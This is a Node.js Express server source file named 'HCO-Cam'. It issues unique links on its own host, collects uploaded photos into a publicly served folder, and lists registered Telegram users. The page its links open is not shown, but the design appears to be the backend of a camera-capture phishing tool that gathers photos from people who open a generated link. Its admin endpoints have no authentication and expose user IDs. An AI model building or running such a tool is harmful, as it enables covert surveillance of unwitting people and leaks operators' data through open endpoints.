const express = require("express");
const multer = require("multer");
const path = require("path");
const { v4: uuidv4 } = require("uuid");
const fs = require("fs");

const app = express();
const PORT = process.env.PORT || 3000;

/* =====================
   MEMORY STORAGE
===================== */
let users = new Set();
let photoCount = 0;

/* =====================
   MIDDLEWARE
===================== */
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static("public"));

if (!fs.existsSync("uploads")) {
  fs.mkdirSync("uploads", { recursive: true });
}
app.use("/uploads", express.static("uploads"));

/* =====================
   UPLOAD CONFIG
===================== */
const storage = multer.diskStorage({
  destination: "uploads/",
  filename: (_, __, cb) => cb(null, uuidv4() + ".jpg")
});
const upload = multer({ storage });

/* =====================
   ROUTES
===================== */

app.get("/", (_, res) => {
  res.sendFile(path.join(__dirname, "public/index.html"));
});

app.post("/api/register", (req, res) => {
  const { telegram_id } = req.body;
  if (telegram_id) users.add(telegram_id);
  res.json({ success: true });
});

app.post("/api/generate", (req, res) => {
  const id = uuidv4();
  const protocol = req.headers["x-forwarded-proto"] || "https";
  const host = req.headers.host;

  res.json({
    link: `${protocol}://${host}/?id=${id}`
  });
});

app.post("/api/upload", upload.single("photo"), (req, res) => {
  photoCount++;
  res.json({ success: true });
});

/* =====================
   ADMIN
===================== */
app.get("/api/admin/stats", (_, res) => {
  res.json({
    users: users.size,
    photos: photoCount
  });
});

app.get("/api/admin/users", (_, res) => {
  res.json([...users].map(id => ({ telegram_id: id })));
});

/* =====================
   START
===================== */
app.listen(PORT, () => {
  console.log(`
🚀 HCO-Cam Server Running
========================
Port: ${PORT}
Users API: /api/admin/users
Stats API: /api/admin/stats
Uploads: /uploads
========================
`);
});
